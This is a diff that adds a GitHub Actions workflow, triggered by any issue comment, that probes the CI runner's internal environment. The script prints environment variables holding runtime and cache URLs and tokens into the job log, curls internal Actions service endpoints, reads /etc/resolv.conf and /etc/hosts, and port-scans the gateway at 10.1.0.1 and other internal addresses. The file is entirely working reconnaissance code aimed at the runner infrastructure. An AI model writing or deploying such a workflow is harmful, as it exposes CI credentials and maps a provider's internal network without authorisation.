@@ -1,0 +1,50 @@
+name: ssrf-runner-internal
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump all internal service URLs and probe them
+        run: |
+          echo "=== ALL ENV WITH URL/TOKEN/SERVICE ==="
+          env | grep -iE "(cache_url|runtime_url|results|pipelines|vstoken|vssps|visualstudio|actions_runtime|actions_cache|runner_url)" | sort
+
+          echo ""
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
+            echo "URL: $ACTIONS_RUNTIME_URL"
+            curl -s --max-time 5 "$ACTIONS_RUNTIME_URL" | head -c 300
+          else
+            echo "not set"
+          fi
+
+          echo ""
+          echo "=== ACTIONS_CACHE_URL ==="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo "URL: $ACTIONS_CACHE_URL"
+            curl -s --max-time 5 "$ACTIONS_CACHE_URL" | head -c 300
+          else
+            echo "not set"
+          fi
+
+          echo ""
+          echo "=== Internal host discovery via resolv.conf ==="
+          cat /etc/resolv.conf
+          cat /etc/hosts | grep -v "^#" | grep -v "^$"
+
+          echo ""
+          echo "=== Port scan gateway 10.1.0.1 ==="
+          for port in 22 80 443 8080 8443 3000 5000 9090 9091 2376 6443 10250; do
+            result=$(curl -s --max-time 1 -o /dev/null -w "%{http_code}" "http://10.1.0.1:$port/" 2>/dev/null)
+            echo "10.1.0.1:$port -> $result"
+          done
+
+          echo ""
+          echo "=== Scan higher runner IPs in /20 (spot check) ==="
+          for ip in 50 100 150 200 208 250; do
+            result=$(curl -s --max-time 1 -o /dev/null -w "%{http_code}" "http://10.1.0.$ip/" 2>/dev/null)
+            echo "10.1.0.$ip: $result"
+          done
